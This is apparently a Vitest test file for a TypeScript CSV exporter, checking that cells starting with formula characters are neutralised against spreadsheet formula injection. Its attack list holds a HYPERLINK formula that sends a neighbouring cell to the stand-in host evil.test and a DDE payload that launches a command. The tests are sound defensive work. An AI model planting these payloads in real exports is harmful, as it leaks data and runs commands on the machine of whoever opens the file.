/// <reference types="vite/client" />
import { describe, it, expect, vi } from "vitest";

// Every value in an export is something a person typed - an employee's name, a ticket title, an expense note.
// Excel, Sheets and LibreOffice read a CSV cell beginning `=`, `+`, `-`, `@` (or a tab/CR) as a FORMULA, so
// without neutralisation an employee can leave one in a field of their own and have it execute in HR's hands
// the moment the export is opened. `=HYPERLINK("https://…"&A2,"Payslip")` is the practical one: it renders as
// an ordinary link and carries the row beside it away when clicked, with no macro warning at all.
//
// The module reaches for `@/api` at import time (an export is audited server-side); nothing here calls it.
vi.mock("@/api", () => ({ api: () => Promise.resolve() }));

const { toCsv } = await import("@/lib/exportTable");

// One CSV cell, parsed back the way a spreadsheet does: strip the RFC-4180 quoting, then look at what is left.
// Quoting is NOT a defence on its own, which is the reason this unwraps before asserting.
function cells(line: string): string[] {
  const out: string[] = [];
  let cur = "";
  let quoted = false;
  for (let i = 0; i < line.length; i++) {
    const c = line[i]!;
    if (quoted) {
      if (c === '"' && line[i + 1] === '"') { cur += '"'; i++; }
      else if (c === '"') quoted = false;
      else cur += c;
    } else if (c === '"') quoted = true;
    else if (c === ",") { out.push(cur); cur = ""; }
    else cur += c;
  }
  out.push(cur);
  return out;
}

const body = (csv: string) => csv.split("\r\n").slice(1); // drop the header row

describe("CSV export: a typed-in value can never become a formula", () => {
  it("neutralises every formula lead, including one the quoting would otherwise hide", () => {
    const attacks = [
      '=HYPERLINK("https://evil.test?x="&A2,"Payslip")', // exfiltrates the row beside it, no warning shown
      "=cmd|'/c calc'!A1", // DDE
      "+1+1",
      "-1+1",
      "@SUM(A1:A9)",
      "\t=1+1",
    ];
    const csv = toCsv(["Name"], attacks.map((a) => [a]));
    body(csv).forEach((line, i) => {
      const value = cells(line)[0]!;
      expect(value.startsWith("'"), `${attacks[i]} was left executable`).toBe(true);
      // The original text survives - this is about how a reader TREATS the cell, not about editing what
      // somebody wrote.
      expect(value.slice(1)).toBe(attacks[i]);
    });
  });

  it("leaves numbers alone, so a negative amount is still a number in the sheet", () => {
    const csv = toCsv(["Amount"], [[-500], ["-1234.56"], [0], [1e3], ["+42"]]);
    expect(body(csv).map((l) => cells(l)[0])).toEqual(["-500", "-1234.56", "0", "1000", "+42"]);
  });

  it("still quotes what RFC-4180 requires, and does not touch ordinary text", () => {
    const csv = toCsv(["Name", "Note"], [["Priya, R.", 'said "hi"'], ["Ordinary", "text"]]);
    expect(body(csv)[0]).toBe('"Priya, R.","said ""hi"""');
    expect(body(csv)[1]).toBe("Ordinary,text");
  });

  it("writes a blank for an empty cell rather than the word null", () => {
    expect(body(toCsv(["A", "B"], [[null, undefined]]))[0]).toBe(",");
  });
});
